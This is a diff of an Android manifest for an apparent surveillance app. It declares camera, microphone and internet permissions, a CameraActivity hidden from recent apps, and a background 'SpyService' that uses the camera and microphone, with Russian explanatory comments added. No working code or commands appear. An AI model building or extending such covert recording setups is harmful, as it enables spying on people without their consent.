@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+    
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
@@ -18,6 +19,7 @@
         android:usesCleartextTraffic="true"
         android:theme="@style/Theme.AppCompat.Light">
         
+        <!-- Главный экран с кнопкой -->
         <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -25,13 +27,16 @@
             </intent-filter>
         </activity>
 
+        <!-- Экран для камеры (тема без панели действий обязательна) -->
         <activity android:name=".CameraActivity" 
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="false"
             android:excludeFromRecents="true"
-            android:exported="false"/>
+            android:theme="@style/Theme.AppCompat.NoActionBar"/>
         
+        <!-- Фоновый сервис -->
         <service android:name=".SpyService" 
             android:foregroundServiceType="camera|microphone"
             android:exported="false"/>
+            
     </application>
 </manifest>
